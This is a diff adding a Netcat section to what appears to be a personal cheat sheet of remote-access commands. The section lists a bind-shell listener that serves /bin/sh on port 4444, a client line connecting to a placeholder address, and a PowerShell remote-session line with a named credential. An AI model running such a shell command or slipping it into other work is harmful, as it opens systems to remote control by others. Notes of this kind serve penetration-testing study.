@@ -28,3 +28,20 @@ pattern 2
 ```pwsh
 Enter-PSSession -ComputerName "hostname"-Credential "easyduck"
 ```
+
+## Netcat
+
+## Server Settings
+
+RPORT = `4444`
+RHOST = `xxx.xxx.xxx.xxx`
+
+```bash
+nc -lvp 4444 -e /bin/sh
+```
+
+## Client
+
+```bash
+nc xxx.xxx.xxx.xxx 4444
+```
